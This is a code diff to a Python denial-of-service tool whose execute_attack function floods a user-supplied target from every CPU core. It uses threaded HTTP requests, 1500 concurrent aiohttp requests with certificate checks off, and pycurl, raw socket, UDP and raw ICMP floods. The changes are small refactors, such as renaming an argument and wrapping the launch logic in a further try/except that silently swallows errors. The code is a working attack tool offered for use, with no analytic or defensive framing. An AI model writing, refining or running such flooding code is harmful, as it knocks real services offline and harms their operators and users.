@@ -18,7 +18,7 @@ stop_attack_flag = multiprocessing.Value('b', False)
 async def send_requests_aiohttp(target):
     async def send_request():
         async with aiohttp.ClientSession() as session:
-            async with session.get(target, verify_ssl=False) as response:
+            async with session.get(target, verify=False) as response:
                 await response.read()
 
     tasks = [asyncio.create_task(send_request()) for _ in range(1500)]
@@ -37,7 +37,7 @@ def send_requests_threaded(target):
         except:
             pass
 
-    num_threads = 1500  
+    num_threads = 1500
     with ThreadPoolExecutor(max_workers=num_threads) as executor:
         futures = [executor.submit(send_request) for _ in range(num_threads)]
 
@@ -77,6 +77,7 @@ def send_requests_icmp(target):
     host, port = target.split(":")
     port = int(port)
 
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
 
     while not stop_attack_flag.value:
@@ -91,52 +92,56 @@ def start_attack():
         pass
 
 def execute_attack(target):
-    total_cores = multiprocessing.cpu_count()
-
-    print(f"Starting continuous attack on {target} using {total_cores} cores...")
-
-    show_attack_animation()
-
-    processes = []
-
-    with stop_attack_flag.get_lock():
-        stop_attack_flag.value = False
-
     try:
-        for i in range(total_cores):
-            process = multiprocessing.Process(target=send_requests_threaded, args=(target,))
-            processes.append(process)
-            process.start()
+        total_cores = multiprocessing.cpu_count()
 
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(send_requests_aiohttp(target))
+        print(f"Starting continuous attack on {target} using {total_cores} cores...")
 
-        pycurl_process = multiprocessing.Process(target=send_requests_pycurl, args=(target,))
-        processes.append(pycurl_process)
-        pycurl_process.start()
+        show_attack_animation()
 
-        socket_process = multiprocessing.Process(target=send_requests_socket, args=(target,))
-        processes.append(socket_process)
-        socket_process.start()
+        processes = []
 
-        udp_process = multiprocessing.Process(target=send_requests_udp, args=(target,))
-        processes.append(udp_process)
-        udp_process.start()
-
-        icmp_process = multiprocessing.Process(target=send_requests_icmp, args=(target,))
-        processes.append(icmp_process)
-        icmp_process.start()
-
-        print(Fore.YELLOW + "Attack in progress... Press Ctrl+C to stop." + Style.RESET_ALL)
-
-        for process in processes:
-            process.join()
-
-    except KeyboardInterrupt:
         with stop_attack_flag.get_lock():
-            stop_attack_flag.value = True
-        print(Fore.RED + "Attack stopped." + Style.RESET_ALL)
+            stop_attack_flag.value = False
+
+        try:
+            for i in range(total_cores):
+                process = multiprocessing.Process(target=send_requests_threaded, args=(target,))
+                processes.append(process)
+                process.start()
+
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            loop.run_until_complete(send_requests_aiohttp(target))
+
+            pycurl_process = multiprocessing.Process(target=send_requests_pycurl, args=(target,))
+            processes.append(pycurl_process)
+            pycurl_process.start()
+
+            socket_process = multiprocessing.Process(target=send_requests_socket, args=(target,))
+            processes.append(socket_process)
+            socket_process.start()
+
+            udp_process = multiprocessing.Process(target=send_requests_udp, args=(target,))
+            processes.append(udp_process)
+            udp_process.start()
+
+            icmp_process = multiprocessing.Process(target=send_requests_icmp, args=(target,))
+            processes.append(icmp_process)
+            icmp_process.start()
+
+            print(Fore.YELLOW + "Attack in progress... Press Ctrl+C to stop." + Style.RESET_ALL)
+
+            for process in processes:
+                process.join()
+
+        except KeyboardInterrupt:
+            with stop_attack_flag.get_lock():
+                stop_attack_flag.value = True
+            print(Fore.RED + "Attack stopped." + Style.RESET_ALL)
+
+        except:
+            pass
 
     except:
         pass
